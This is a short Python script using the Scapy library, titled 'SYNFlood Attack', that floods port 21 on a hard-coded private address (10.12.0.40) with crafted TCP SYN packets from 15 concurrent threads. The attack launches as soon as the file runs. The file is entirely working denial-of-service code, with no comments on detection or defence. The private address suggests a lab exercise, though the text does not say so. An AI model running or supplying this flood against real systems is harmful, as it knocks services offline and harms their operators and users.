import scapy.all as scapy
from scapy.layers.inet import IP, TCP, ICMP, UDP
import threading

"""
SYNFlood Attack
"""

target_ip = "10.12.0.40"
target_port = 21

def synflood():
    topt=[("Timestamp", (10,0))]
    p=IP(dst=target_ip, id=1111,ttl=99)/TCP(sport=scapy.RandShort(),dport=target_port,seq=12345,ack=
        1000,window=1000,flags="S",options=topt)
    ans,unans=scapy.srloop(p,inter=0.3,retry=2,timeout=4)

def threaded_attacks():
    threads = list()
    for index in range(15):
        x = threading.Thread(target=synflood)
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        thread.join()

threaded_attacks()